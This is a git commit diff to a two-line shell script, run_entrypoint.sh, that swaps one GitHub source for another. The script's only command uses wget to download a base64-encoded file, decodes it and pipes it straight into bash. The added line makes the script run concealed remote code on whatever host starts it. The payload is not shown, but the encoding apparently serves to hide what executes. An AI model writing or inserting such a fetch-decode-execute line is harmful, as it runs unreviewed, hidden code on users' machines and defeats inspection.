7b9ba7408f824efc3bc72faf6034569a0527e328
khangelanimbhoshongo <163496625+khangelanimbhoshongo@users.noreply.github.com>
2026-06-23 12:48:26 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/marcbadgley/fat/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/khangelanimbhoshongo/globe/refs/heads/main/entrypoint.sh | base64 -d | bash
